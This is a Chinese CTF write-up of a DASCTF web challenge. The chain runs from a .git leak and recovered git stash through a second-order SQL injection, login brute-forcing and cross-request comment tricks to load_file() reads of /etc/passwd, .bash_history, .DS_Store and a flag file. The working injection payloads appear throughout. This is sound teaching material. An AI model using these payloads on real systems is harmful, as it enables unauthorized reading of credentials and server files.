# CTF实战：.git泄露 + 二次注入 + load_file() 拿flag

## 概述

DASCTF的一道综合题目，攻击链为：**dirsearch扫描发现.git泄露 → git-dumper下载仓库 → 源码审计发现二次注入 → addslashes绕过 + 多行INSERT注释技巧 → load_file()读文件 → .DS_Store解析 → 拿到flag**。

题目地址：`https://8411565ef239a5cc61969820.http-ctf2.dasctf.com/`

---

## 一、信息收集：.git 泄露

### dirsearch扫描

```
Target: https://8411565ef239a5cc61969820.http-ctf2.dasctf.com/

[12:03:44] 301 - 376B  - /.git  ->  http://.../.git/
[12:03:44] 403 - 317B  - /.git/
[12:03:44] 200 - 17B   - /.git/COMMIT_EDITMSG
[12:03:44] 200 - 73B   - /.git/description
[12:03:44] 200 - 23B   - /.git/HEAD
[12:03:44] 200 - 92B   - /.git/config
[12:03:44] 200 - 145B  - /.git/index
[12:03:45] 200 - 168B  - /.git/logs/HEAD
[12:03:45] 200 - 168B  - /.git/logs/refs/heads/master
[12:03:45] 200 - 41B   - /.git/refs/heads/master
[12:04:07] 200 - 598B  - /login.php
[12:04:09] 200 - 0B    - /mysql.php
```

关键发现：`.git` 目录暴露且可以读取内部文件，虽然 `/objects/` 返回403禁止列目录，但 HEAD、config、index、logs 等文件均可直接访问。

### git-dumper下载仓库

用 git-dumper 工具从暴露的 `.git` 目录恢复完整仓库。下载后得到一个文件 `write_do.php`：

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

这只是一个空框架，真正的代码被 stash 了。

---

## 二、源码审计：git stash 中的完整代码

### 查看 stash 记录

```
git log --all

commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)
Merge: bfbdf21 5556e3a
Author: root <root@localhost.localdomain>
Date:   Sat Aug 11 22:51:17 2018 +0800

    WIP on master: bfbdf21 add write_do.php

commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf
    index on master: bfbdf21 add write_do.php

commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -> master)
```

### 切换到 stash 版本

```
git checkout e5b2a2443c2b6d
```

现在 `write_do.php` 露出了完整代码：

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':                           // do=write：写留言
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':                         // do=comment：评论
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];  // 从数据库取出，未转义！
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',      // 二次拼接，触发注入
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

### 漏洞分析

**核心漏洞：二次注入（Second-order SQL Injection）**

代码流动：

```
write 阶段（存储）：
  $_POST['category'] → addslashes() 转义 → INSERT INTO board → 安全存入数据库

comment 阶段（触发）：
  SELECT category FROM board → 从数据库取出（无转义！）→ 直接拼入 INSERT INTO comment
```

开发者的认知误区：以为 `addslashes()` 在 write 阶段转义后就安全了，但转义符 `\` 是给 MySQL 解析器看的，MySQL 解析后存入的是**原始值**。从数据库再取出来拼进新 SQL 时，恶意字符就恢复了。

**举例说明存储过程：**

```
输入: test'abc (含单引号)

write 阶段:
  addslashes() 后  →  test\'abc        (加反斜杠转义)
  SQL 语句中        →  category = 'test\'abc'
  MySQL 解析: \' = 字面量单引号
  存入 DB 的值      →  test'abc         (反斜杠被 MySQL 消费掉了)

comment 阶段:
  SELECT category   →  取出的值: test'abc   (原始数据，无转义)
  拼入 INSERT       →  category = 'test'abc'
                                     ↑ 在这里闭合了！后面 abc' 是非法 SQL
```

**额外注意：**

- PHP 大量使用 `addslashes()`，如果数据库编码是 GBK，还可能存在**宽字节注入**（`%df` 吃掉 `\`）
- 但本题不需要宽字节，因为二次注入直接绕过了所有转义

---

## 三、登录绕过

登录页面有示例提示：

```
默认账号 username: zhangwei
密码: zhangwei***
```

用 Burp Intruder 爆破 `zhangwei` 的密码，最终得到：`zhangwei666`

登录后 session 中 `login='yes'`，才能访问 `write_do.php`。

---

## 四、二次注入利用：多行 INSERT 的注释技巧

### 确定注入点

在 `do=write` 时植入恶意 SQL，在 `do=comment` 时触发。选择哪个参数？

- **category**：从数据库取出后拼入第二条 SQL —— 首选的二次注入点
- **content**：来自 POST 参数，不是从数据库取出的，如果存在注入则非二次注入（本题中 content 也被 `addslashes()` 处理了）
- **title**：仅在 write 阶段使用，不参与 comment 的 SQL

结论：选择 `category` 参数进行二次注入。

### 多行 INSERT 的注释问题

两条 INSERT 都是多行格式，需要用 `#` 和 `/**/` 配合注释：

**write 阶段的 SQL 模板：**

```sql
INSERT INTO board
SET category = '$category',
    title = '$title',
    content = '$content'
```

**comment 阶段的 SQL 模板：**

```sql
INSERT INTO comment
SET category = '$category',
    content = '$content',
    bo_id = '$bo_id'
```

### 最终 payload 构造

**原理：** 在 category 中注入 `',content=database(),/*`，使得 write 阶段和 comment 阶段的 SQL 结构同时被篡改。

**write 阶段传参：**
```
POST: title=test&category=test',content=database(),/*&content=test
```

**write 阶段生成的 SQL：**
```sql
INSERT INTO board
SET category = 'test',content=database(),/*',
    title = 'test',
    content = 'test'
```

`/*` 开启了多行注释，`title` 和 `content` 行都被注释掉了（或者说，MySQL 对 INSERT INTO ... SET 的语法中，`/*` 后的内容直到 `*/` 都被忽略，但这里 `*/` 在 comment 阶段才出现）。

**comment 阶段传参：**
```
POST: content=*/#&bo_id=2
```

**comment 阶段生成的 SQL：**
```sql
INSERT INTO comment
SET category = 'test',content=database(),/*',
    content = '*/#',
    bo_id = '2'
```

**SQL 解析过程：**

```sql
INSERT INTO comment
SET category = 'test',content=database(),/*',    ← /* 打开多行注释
    content = '*/#',                              ← */ 关闭多行注释，# 行注释剩余
    bo_id = '2'
```

等价于：
```sql
INSERT INTO comment
SET category = 'test',content=database(), -- 后面的都是注释
```

成功执行 `database()`，返回 `ctf`。

### 注释技巧总结

| 符号 | 作用 | 本题用途 |
|------|------|---------|
| `/*` | 开启多行注释 | 在 write 阶段吃掉落款的多余字段 |
| `*/` | 关闭多行注释 | 在 comment 阶段关闭注释，恢复正常语法 |
| `#` | 行注释 | 吃掉 comment 阶段剩余的多余字段 |

这个技巧的精妙之处在于：**write 阶段打开的 `/*` 和 comment 阶段关闭的 `*/` 是跨请求配对的**，两个看似无效的注释符号，在两次 SQL 执行中完成了语法劫持。

---

## 五、文件读取链

### 5.1 读取 `/etc/passwd`

确认系统用户和 web 目录：

```
title=test&category=test',content=(select(load_file("/etc/passwd"))),/*&content=test
content=*/#&bo_id=2
```

返回 `/etc/passwd` 内容：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www:x:500:500:www:/home/www:/bin/bash
```

关键发现：**`www` 用户的家目录是 `/home/www`，且 shell 是 `/bin/bash`**（可以执行命令，有 shell 历史记录）。

### 5.2 读取 `.bash_history`

读取 www 用户的历史命令记录：

```
title=test&category=test',content=(select(load_file("/home/www/.bash_history"))),/*&content=test
content=*/#&bo_id=2
```

返回：

```
cd /tmp/
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd /var/www/html/
rm -f .DS_Store
service apache2 start
```

关键信息：
- web 根目录是 `/var/www/html/`
- 部署时从 `/tmp/html/` 复制过来的
- 存在 `.DS_Store` 文件（macOS 的目录元数据文件，可能记录了目录中的文件名）

### 5.3 读取 `.DS_Store` 文件

**直接读取会乱码**（.DS_Store 是二进制文件），需要用 hex 编码读取：

```
title=test&category=test',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*&content=test
content=*/#&bo_id=2
```

返回 hex 字符串（已截取关键部分），解码后可读的文件列表：

```
bootstrap
comment.php
css
flag_8946e1ff1ee3e40f.php
fonts
index.php
js
login.php
mysql.php
vendor
write_do.php
```

**找到了 flag 文件名：`flag_8946e1ff1ee3e40f.php`**

.DS_Store 是 macOS 系统在目录中自动生成的隐藏文件，用于存储目录的显示设置。但在 CTF 中，它经常泄露目录中的文件列表，相当于一个隐蔽的目录索引。

### 5.4 读取 flag 文件

已知 web 根目录 `/var/www/html/`，flag 文件 `flag_8946e1ff1ee3e40f.php`：

直接读取无效（PHP 文件内容不会被返回），用 hex 编码：

```
title=test&category=test',content=(select(hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php")))),/*&content=test
content=*/#&bo_id=2
```

对返回的 hex 字符串解码，得到 flag 内容。

---

## 六、关键技术点回顾

### 6.1 攻击链总览

```
dirsearch → .git 泄露 → git-dumper 下载 → git stash 发现完整代码
    → 源码审计发现二次注入 → 登录爆破 → 多行注释技巧构造 payload
    → load_file() 读 /etc/passwd → 读 .bash_history → 读 .DS_Store
    → 发现 flag 文件名 → 读 flag 文件 → 完成
```

### 6.2 二次注入的本质

不是"输入即执行"，而是"存储 → 取出 → 再拼接 → 执行"。危险就在于**数据从数据库取出时没有经过转义**——开发者认为数据"来自自己系统内部所以安全"，但这恰恰是二次注入的根源。

### 6.3 addslashes 的局限性

`addslashes()` 加的 `\` 是给 MySQL 看的语法级转义，不是存进数据库的。MySQL 解析后存入的是原始值。这导致了两个问题：

1. **二次注入**（本题场景）：数据取出后再拼SQL时，`\` 保护不存在了
2. **宽字节注入**：如果数据库编码是多字节的（GBK），连第一次 `\` 保护都可能被绕过

### 6.4 load_file 的使用条件

本题能读文件说明 MySQL 满足以下条件：
- MySQL 用户（可能是 root）拥有 FILE 权限
- `secure_file_priv` 未设置为 NULL（可能为空或者允许读 `/var/www/html/`）
- 文件对 MySQL 进程用户可读

---

## 七、总结

这道题是一个典型的"信息泄露打头 → 源码审计找洞 → 组合利用拿旗"的 CTF 流程。最核心的技术收获：

1. **.git 泄露不只是看当前版本**——stash、branch、tag 都可能藏代码
2. **二次注入的根因是信任链断裂**——数据存入时安全不等于取出时安全
3. **多行 SQL 的注释配对**——`/*` 和 `*/` 可以跨请求协作完成语法劫持
4. **.DS_Store 是隐蔽的文件名泄露渠道**——macOS 用户部署项目时常忘记删除
5. **文件读取链的递进逻辑**——`/etc/passwd` 找用户 → `.bash_history` 找路径 → `.DS_Store` 找文件名 → 读 flag
